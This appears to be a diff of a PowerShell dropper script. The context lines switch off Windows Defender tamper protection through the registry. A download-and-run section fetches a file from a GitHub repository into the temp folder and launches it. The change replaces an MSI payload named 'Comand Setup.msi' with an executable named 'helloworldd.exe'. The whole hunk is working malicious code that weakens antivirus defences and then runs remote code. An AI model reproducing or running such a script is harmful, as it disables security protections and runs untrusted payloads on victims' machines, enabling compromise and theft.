@@ -34,7 +34,7 @@ $tp = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
 Set-ItemProperty -Path $tp -Name "TamperProtection" -Value 0 -Force
 
 # ============ DOWNLOAD + RUN MSI ============
-$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand%20Setup.msi"
-$out = Join-Path $env:TEMP "Comand Setup.msi"
+$url = "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe"
+$out = Join-Path $env:TEMP "helloworldd.exe"
 Invoke-WebRequest -Uri $url -OutFile $out
 Start-Process $out
